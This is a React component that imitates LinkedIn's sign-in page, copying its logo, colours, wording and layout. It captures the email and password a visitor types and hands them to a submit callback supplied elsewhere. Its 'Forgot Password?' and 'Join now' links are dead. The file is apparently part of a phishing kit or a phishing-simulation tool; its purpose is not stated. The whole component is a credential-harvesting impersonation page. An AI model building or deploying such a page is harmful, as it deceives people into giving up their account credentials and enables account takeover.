'use client'

import { useState } from 'react'

interface LinkedInPageProps {
  onSubmit: (data: { email?: string; password?: string }) => void
}

export function LinkedInPage({ onSubmit }: LinkedInPageProps) {
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [loading, setLoading] = useState(false)

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoading(true)
    await onSubmit({ email, password })
    setLoading(false)
  }

  return (
    <div className="min-h-screen bg-white flex items-center justify-center px-4 py-12" style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif' }}>
      <div className="w-full max-w-[400px]">
        {/* LinkedIn Card */}
        <div className="bg-white rounded-lg shadow-md p-12" style={{ boxShadow: '0 0 0 1px rgba(0,0,0,0.08), 0 4px 12px rgba(0,0,0,0.15)' }}>
          {/* LinkedIn Logo */}
          <div className="flex justify-center mb-6">
            <img src="/linkdin_logo.png" alt="LinkedIn" className="h-6 w-auto" />
          </div>

          {/* Heading */}
          <h1 className="text-3xl font-semibold text-center mb-2" style={{ color: '#000000' }}>Sign in</h1>
          
          {/* Subheading */}
          <p className="text-sm text-center mb-8" style={{ color: '#000000', opacity: 0.9 }}>
            Stay updated on your professional world
          </p>

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Email"
                className="w-full px-4 py-3 text-base border border-gray-300 rounded focus:outline-none focus:border-blue-600 focus:ring-1 focus:ring-blue-600"
                style={{ borderColor: '#CACCCF' }}
                required
              />
            </div>
            <div>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                className="w-full px-4 py-3 text-base border border-gray-300 rounded focus:outline-none focus:border-blue-600 focus:ring-1 focus:ring-blue-600"
                style={{ borderColor: '#CACCCF' }}
                required
              />
            </div>
            <div className="text-right">
              <a href="#" className="text-sm font-semibold hover:underline" style={{ color: '#0A66C2' }}>
                Forgot Password?
              </a>
            </div>
            <button
              type="submit"
              disabled={loading}
              className="w-full py-3 text-base font-semibold text-white rounded-full disabled:opacity-50 disabled:cursor-not-allowed"
              style={{ backgroundColor: '#0A66C2' }}
            >
              {loading ? 'Signing in...' : 'Sign in'}
            </button>
          </form>
        </div>

        {/* Footer */}
        <div className="mt-6 text-center text-sm">
          <p style={{ color: '#000000', opacity: 0.7 }}>
            New to LinkedIn?{' '}
            <a href="#" className="font-semibold hover:underline" style={{ color: '#0A66C2' }}>Join now</a>
          </p>
        </div>
      </div>
    </div>
  )
}

